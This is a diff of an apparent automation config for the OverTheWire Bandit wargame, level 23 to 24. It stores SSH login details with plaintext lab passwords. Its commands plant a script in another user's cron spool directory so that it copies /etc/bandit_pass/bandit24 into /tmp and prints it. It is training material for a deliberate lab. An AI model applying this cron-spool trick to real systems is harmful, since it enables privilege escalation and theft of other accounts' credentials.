@@ -2,14 +2,16 @@
     "host": "bandit.labs.overthewire.org",
     "port": 2220,
     "user": "bandit23",
-    "pass": "jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n",
+    "pass": "QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G",
     "commands": [
-      "echo '#!/bin/sh' > /tmp/sleifer2323/script",
+      "mkdir -p /tmp/sleifer2323",
+      "rm -f /tmp/sleifer2323/*",
+      "echo '#!/usr/bin/bash' > /tmp/sleifer2323/script",
       "echo 'mkdir -p /tmp/sleifer2424' >> /tmp/sleifer2323/script",
-      "echo 'cat /etc/bandit_pass/bandit24 > /tmp/sleifer2424/password' >> /tmp/sleifer2323/script",
-      "echo 'chmod +x /tmp/sleifer2323/script' >> /tmp/sleifer2323/script",
-      "cp /tmp/sleifer2323/script /var/spool/bandit24/sleifer2323",
-      "while [ $(date +%S) -ne 1 ]; do sleep 1; done",
-      "cat /tmp/sleifer2424/password"
+      "echo 'cat /etc/bandit_pass/bandit24 &> /tmp/sleifer2424/password' >> /tmp/sleifer2323/script",
+      "echo 'chmod 744 /tmp/sleifer2424/password' >> /tmp/sleifer2323/script",
+      "chmod +x /tmp/sleifer2323/script",
+      "cp /tmp/sleifer2323/script /var/spool/bandit24/foo/script",
+      "while [ $(date +%S) -ne 1 ]; do sleep 1; done; sleep 1; cat /tmp/sleifer2424/password"
     ]
 }
